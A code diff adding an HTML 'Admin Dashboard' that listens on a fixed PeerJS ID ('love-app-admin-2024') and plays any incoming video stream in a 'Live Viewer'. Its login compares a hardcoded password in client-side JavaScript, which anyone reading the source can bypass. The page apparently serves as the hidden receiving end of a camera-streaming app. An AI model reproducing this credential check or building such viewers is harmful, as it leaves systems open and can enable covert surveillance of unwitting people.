@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard 🔒</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #2c3e50; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .login-box, .video-box { background: #34495e; padding: 30px; border-radius: 10px; text-align: center; width: 90%; max-width: 500px; }
+        input { padding: 10px; font-size: 1.1rem; border-radius: 5px; border: none; margin-bottom: 15px; width: 100%; box-sizing: border-box; }
+        button { padding: 10px 20px; font-size: 1.1rem; border-radius: 5px; border: none; background: #e74c3c; color: white; cursor: pointer; width: 100%; font-weight: bold; }
+        #remoteVideo { width: 100%; border-radius: 10px; background: black; display: none; margin-top: 15px; }
+        .status { margin-top: 15px; color: #f1c40f; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="loginBox">
+        <h2>🔒 Admin Login</h2>
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="login()">Login</button>
+    </div>
+
+    <div class="video-box" id="videoBox" style="display: none;">
+        <h2>Live Viewer</h2>
+        <p class="status" id="statusText">Waiting...</p>
+        <video id="remoteVideo" autoplay playsinline></video>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "mysecret123"; 
+        const ADMIN_PEER_ID = "love-app-admin-2024"; 
+
+        function login() {
+            if (document.getElementById('password').value === ADMIN_PASSWORD) {
+                document.getElementById('loginBox').style.display = 'none';
+                document.getElementById('videoBox').style.display = 'block';
+                startAdminListener();
+            } else {
+                alert("Wrong Password!");
+            }
+        }
+
+        function startAdminListener() {
+            const peer = new Peer(ADMIN_PEER_ID);
+            peer.on('open', () => { document.getElementById('statusText').innerText = "Online! Waiting..."; });
+            
+            peer.on('call', (call) => {
+                call.answer(); 
+                call.on('stream', (remoteStream) => {
+                    document.getElementById('statusText').innerText = "🟢 Connected!";
+                    document.getElementById('statusText').style.color = "#2ecc71";
+                    const video = document.getElementById('remoteVideo');
+                    video.srcObject = remoteStream;
+                    video.style.display = 'block';
+                });
+            });
+        }
+    </script>
+</body>
+</html>
